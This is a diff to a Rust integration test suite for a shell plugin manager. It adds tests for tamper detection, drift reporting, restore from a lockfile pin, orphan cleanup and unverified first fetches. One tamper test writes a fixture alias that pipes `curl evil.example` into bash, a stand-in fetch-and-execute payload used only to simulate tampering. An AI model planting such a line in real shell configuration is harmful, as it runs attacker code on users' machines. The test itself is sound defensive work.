@@ -362,11 +362,11 @@ fn setup_noninteractive_stays_deterministic_and_records_no_answers() {
     let _ = fs::remove_dir_all(&temp);
 }
 
-/// niubash#179 L05-3: a *gutted* trusted source (directory present,
-/// contents emptied) still lists as "ready" — the checksum state is the
-/// only remaining truth — but `niu plugin list` and `niu plugin discover`
-/// must name the verb that reports it instead of silently showing zero
-/// assets.
+/// niubash#179 L05-3, superseded by niubash#297: a *gutted* trusted source
+/// (directory present, contents emptied) no longer reads "ready" — it no
+/// longer matches its lockfile pin, so the runtime tamper gate reports it
+/// degraded/drifted, and `niu plugin list` / `niu plugin discover` name the
+/// verb that reports the checksums.
 #[test]
 fn gutted_trusted_source_names_the_verify_verb() {
     let temp = temp_dir("plugin-gutted");
@@ -397,9 +397,11 @@ fn gutted_trusted_source_names_the_verify_verb() {
     let list = run_niu_with_env(&["plugin", "list"], &envs);
     assert_success(&list, "plugin list gutted");
     let list_text = stdout_text(&list);
+    // niubash#297: the gutted tree reads degraded (pin mismatch) — the old
+    // "still ready" reading was the blind spot this gate closes.
     assert!(
-        list_text.contains("ready"),
-        "gutted tree still registers as ready: {list_text}"
+        list_text.contains("degraded") || list_text.contains("drifted"),
+        "a gutted trusted tree must not read ready: {list_text}"
     );
     assert!(
         list_text.contains("niu plugin source verify oh-my-bash"),
@@ -413,6 +415,304 @@ fn gutted_trusted_source_names_the_verify_verb() {
         "discover must name the verify verb for a gutted tree: {}",
         stdout_text(&discover)
     );
+
+    let _ = fs::remove_dir_all(&temp);
+}
+
+// ── niubash#297: the runtime tamper gate, end to end ─────────────────────────
+
+/// A git-origin OMB tree (so `restore` can rebuild) installed through the
+/// declarative `niu plugin add`, trusted, then tampered: sync must say
+/// `drift` (never `unchanged`), `plugin list --json` must report
+/// degraded=true with the drift reason, the drift ledger must carry the id
+/// (the rc blocks' static guard reads it), and `restore` must repair with
+/// the honest "rebuilt from the lockfile pin" wording.
+#[test]
+fn tampered_trusted_source_is_drift_not_unchanged() {
+    let temp = temp_dir("plugin-drift-e2e");
+    let root = temp.join("sources");
+    let home = temp.join("home");
+    fs::create_dir_all(&home).unwrap();
+    let repo = temp.join("omb-repo");
+    let fixture = omb_fixture();
+    copy_tree(&fixture, &repo);
+    let git = |args: &[&str]| {
+        let out = Command::new("git")
+            .arg("-C")
+            .arg(&repo)
+            .args(args)
+            .env("GIT_AUTHOR_NAME", "t")
+            .env("GIT_AUTHOR_EMAIL", "t@example.com")
+            .env("GIT_COMMITTER_NAME", "t")
+            .env("GIT_COMMITTER_EMAIL", "t@example.com")
+            .output()
+            .expect("git must be available");
+        assert!(
+            out.status.success(),
+            "git {args:?} failed: {}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+    };
+    git(&["init", "-q"]);
+    git(&["add", "-A"]);
+    git(&["commit", "-q", "-m", "v1"]);
+
+    let repo_str = repo.to_string_lossy().into_owned();
+    let envs: Vec<(&str, PathBuf)> = vec![
+        ("NIU_PLUGIN_SOURCES_ROOT", root.clone()),
+        ("NIU_PLUGIN_SPEC", home.join(".niubash/plugins.toml")),
+        ("USERPROFILE", home.clone()),
+        ("HOME", home.clone()),
+    ];
+
+    // Add (declarative; a dir with --ref clones, pinning the commit),
+    // trust, and a baseline sync that says unchanged (the first sync after
+    // trust is the initial materialization — "activated"; the second is
+    // byte-stable).
+    let add = run_niu_with_env(&["plugin", "add", &repo_str, "--ref", "HEAD"], &envs);
+    assert_success(&add, "plugin add from git origin");
+    let trust = run_niu_with_env(&["plugin", "trust", "oh-my-bash"], &envs);
+    assert_success(&trust, "plugin trust");
+    let materialize = run_niu_with_env(&["plugin", "sync"], &envs);
+    assert_success(&materialize, "materializing sync");
+    let baseline = run_niu_with_env(&["plugin", "sync"], &envs);
+    assert_success(&baseline, "baseline sync");
+    assert!(
+        stdout_text(&baseline).contains("unchanged"),
+        "{}",
+        stdout_text(&baseline)
+    );
+
+    // Tamper the trusted tree: sync must NOT say unchanged anymore.
+    let installed_plugin = root.join("oh-my-bash/plugins/git/git.plugin.sh");
+    fs::write(&installed_plugin, "alias evil='curl evil.example | bash'\n").unwrap();
+
+    let drifted = run_niu_with_env(&["plugin", "sync"], &envs);
+    let drift_text = stdout_text(&drifted);
+    assert!(drift_text.contains("drift"), "{drift_text}");
+    assert!(!drift_text.contains("unchanged"), "{drift_text}");
+    assert!(
+        drift_text.contains("niu plugin source verify oh-my-bash")
+            && drift_text.contains("niu plugin restore oh-my-bash"),
+        "the drift row must name the way out: {drift_text}"
+    );
+
+    // `plugin list --json`: degraded=true with the drift reason (the #297
+    // lie was degraded=false over a modified tree).
+    let list = run_niu_with_env(&["plugin", "list", "--json"], &envs);
+    assert_success(&list, "plugin list --json");
+    let json = stdout_text(&list);
+    assert!(json.contains("\"degraded\": true"), "{json}");
+    assert!(
+        json.contains("tree drifted from the lockfile pin"),
+        "{json}"
+    );
+
+    // The drift ledger (what the managed rc blocks' static guard reads).
+    let ledger = root.join("drifted-sources.txt");
+    let ledger_text = fs::read_to_string(&ledger).unwrap();
+    assert!(ledger_text.contains("oh-my-bash"), "{ledger_text}");
+
+    // Repair via the lockfile pin; the wording must be honest about
+    // REBUILDING.
+    let restore = run_niu_with_env(&["plugin", "restore", "oh-my-bash"], &envs);
+    assert_success(&restore, "plugin restore");
+    let restore_text = stdout_text(&restore);
+    assert!(
+        restore_text.contains("rebuilt from the lockfile pin"),
+        "{restore_text}"
+    );
+    assert!(!restore_text.contains("tree matches"), "{restore_text}");
+
+    // Healed: sync is unchanged again and the ledger is gone.
+    let healed = run_niu_with_env(&["plugin", "sync"], &envs);
+    assert!(stdout_text(&healed).contains("unchanged"),);
+    assert!(!ledger.exists(), "the ledger must clear after a repair");
+    let verify = run_niu_with_env(&["plugin", "source", "verify", "oh-my-bash"], &envs);
+    assert_success(&verify, "verify after restore");
+
+    let _ = fs::remove_dir_all(&temp);
+}
+
+/// `clean` lists every orphan directory (no registry record) and only
+/// deletes on `--orphans` (niubash#299).
+#[test]
+fn clean_lists_orphans_and_deletes_them_only_with_the_flag() {
+    let temp = temp_dir("plugin-clean-orphans");
+    let root = temp.join("sources");
+    let envs = [("NIU_PLUGIN_SOURCES_ROOT", root.clone())];
+
+    // A registered install stays; two orphans (one manager-shaped, one
+    // foreign user dir) must be listed, not silently deleted.
+    let add = run_niu_with_env(
+        &["plugin", "source", "add", &omb_fixture().to_string_lossy()],
+        &envs,
+    );
+    assert_success(&add, "source add");
+    let orphan = root.join("orphan-omb");
+    copy_tree(&omb_fixture(), &orphan);
+    fs::create_dir_all(root.join("my-notes")).unwrap();
+    fs::write(root.join("my-notes/keep.txt"), "user data\n").unwrap();
+
+    let report = run_niu_with_env(&["plugin", "clean"], &envs);
+    assert_success(&report, "plugin clean (report)");
+    let text = stdout_text(&report);
+    assert!(text.contains("orphan-omb"), "{text}");
+    assert!(text.contains("my-notes"), "{text}");
+    assert!(text.contains("--orphans"), "{text}");
+    assert!(orphan.is_dir(), "plain clean must not delete orphans");
+    assert!(root.join("my-notes/keep.txt").is_file());
+
+    let purge = run_niu_with_env(&["plugin", "clean", "--orphans"], &envs);
+    assert_success(&purge, "plugin clean --orphans");
+    let purge_text = stdout_text(&purge);
+    assert!(purge_text.contains("orphan-omb"), "{purge_text}");
+    assert!(!orphan.exists(), "--orphans deletes");
+    assert!(!root.join("my-notes").exists(), "--orphans deletes");
+    assert!(root.join("oh-my-bash").is_dir(), "registered tree stays");
+
+    let _ = fs::remove_dir_all(&temp);
+}
+
+// ── niubash#300 + niubash#298: add forms and first-fetch honesty ─────────────
+
+fn copy_tree(src: &std::path::Path, dest: &std::path::Path) {
+    fs::create_dir_all(dest).unwrap();
+    for entry in fs::read_dir(src).unwrap() {
+        let entry = entry.unwrap();
+        let target = dest.join(entry.file_name());
+        if entry.path().is_dir() {
+            if entry.file_name() == ".git" {
+                continue;
+            }
+            copy_tree(&entry.path(), &target);
+        } else {
+            fs::copy(entry.path(), &target).unwrap();
+        }
+    }
+}
+
+/// The bare-path positional form (niubash#300): a local directory
+/// snapshot-copies in, a single .sh/.bash file becomes a one-file wild
+/// source, and a path that does not exist fails honestly instead of
+/// surfacing as a baffling `git clone` status 128.
+#[test]
+fn add_bare_path_forms_snapshot_local_trees() {
+    let temp = temp_dir("plugin-add-paths");
+    let root = temp.join("sources");
+    let home = temp.join("home");
+    fs::create_dir_all(&home).unwrap();
+    let envs: Vec<(&str, PathBuf)> = vec![
+        ("NIU_PLUGIN_SOURCES_ROOT", root.clone()),
+        ("NIU_PLUGIN_SPEC", home.join(".niubash/plugins.toml")),
+        ("USERPROFILE", home.clone()),
+        ("HOME", home.clone()),
+    ];
+
+    // Directory form.
+    let dir_target = temp.join("wild-tree");
+    copy_tree(&omb_fixture(), &dir_target);
+    let add_dir = run_niu_with_env(&["plugin", "add", &dir_target.to_string_lossy()], &envs);
+    assert_success(&add_dir, "plugin add <dir>");
+    assert!(
+        stdout_text(&add_dir).contains("Installed source 'oh-my-bash'"),
+        "{}",
+        stdout_text(&add_dir)
+    );
+
+    // Single-file form.
+    let file_target = temp.join("myscript.bash");
+    fs::write(&file_target, "my_fn() { :; }\n").unwrap();
+    let add_file = run_niu_with_env(
+        &[
+            "plugin",
+            "add",
+            &file_target.to_string_lossy(),
+            "--id",
+            "myscript",
+        ],
+        &envs,
+    );
+    assert_success(&add_file, "plugin add <file>");
+    assert!(
+        stdout_text(&add_file).contains("Installed source 'myscript'"),
+        "{}",
+        stdout_text(&add_file)
+    );
+    let listed = run_niu_with_env(&["plugin", "source", "list", "--json"], &envs);
+    let json = stdout_text(&listed);
+    assert!(json.contains("myscript.bash"), "{json}");
+
+    // Nonexistent path: honest failure, no fetch attempt, no spec strand.
+    let missing = temp.join("no-such-dir");
+    let add_missing = run_niu_with_env(&["plugin", "add", &missing.to_string_lossy()], &envs);
+    assert!(
+        !add_missing.status.success(),
+        "a nonexistent path must fail: {}",
+        stdout_text(&add_missing)
+    );
+    let err = String::from_utf8_lossy(&add_missing.stderr);
+    assert!(err.contains("does not exist"), "{err}");
+    assert!(!err.contains("git clone"), "{err}");
+    let spec = fs::read_to_string(home.join(".niubash/plugins.toml")).unwrap();
+    assert!(
+        !spec.contains("no-such-dir"),
+        "no stranded declaration: {spec}"
+    );
+
+    let _ = fs::remove_dir_all(&temp);
+}
+
+/// niubash#298: the first fetch of an unpinned, non-catalog origin warns
+/// that nothing verified the first delivery (and the record carries
+/// `first_fetch_verified: false`); a `file://` origin keeps the test
+/// offline.
+#[test]
+fn unpinned_remote_first_fetch_warns_and_records() {
+    let temp = temp_dir("plugin-first-fetch");
+    let root = temp.join("sources");
+    let home = temp.join("home");
+    fs::create_dir_all(&home).unwrap();
+    let repo = temp.join("omb-repo");
+    copy_tree(&omb_fixture(), &repo);
+    let git = |args: &[&str]| {
+        let out = Command::new("git")
+            .arg("-C")
+            .arg(&repo)
+            .args(args)
+            .env("GIT_AUTHOR_NAME", "t")
+            .env("GIT_AUTHOR_EMAIL", "t@example.com")
+            .env("GIT_COMMITTER_NAME", "t")
+            .env("GIT_COMMITTER_EMAIL", "t@example.com")
+            .output()
+            .expect("git must be available");
+        assert!(
+            out.status.success(),
+            "git {args:?} failed: {}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+    };
+    git(&["init", "-q"]);
+    git(&["add", "-A"]);
+    git(&["commit", "-q", "-m", "v1"]);
+
+    let file_url = format!("file:///{}", repo.to_string_lossy().replace('\\', "/"));
+    let envs: Vec<(&str, PathBuf)> = vec![
+        ("NIU_PLUGIN_SOURCES_ROOT", root.clone()),
+        ("NIU_PLUGIN_SPEC", home.join(".niubash/plugins.toml")),
+        ("USERPROFILE", home.clone()),
+        ("HOME", home.clone()),
+    ];
+    let add = run_niu_with_env(&["plugin", "add", &file_url], &envs);
+    assert_success(&add, "plugin add file:// origin");
+    let text = stdout_text(&add);
+    assert!(
+        text.contains("NOT integrity-verified"),
+        "the unpinned remote first fetch must warn: {text}"
+    );
+    let list = run_niu_with_env(&["plugin", "source", "list", "--json"], &envs);
+    let json = stdout_text(&list);
+    assert!(json.contains("\"first_fetch_verified\": false"), "{json}");
 
     let _ = fs::remove_dir_all(&temp);
 }
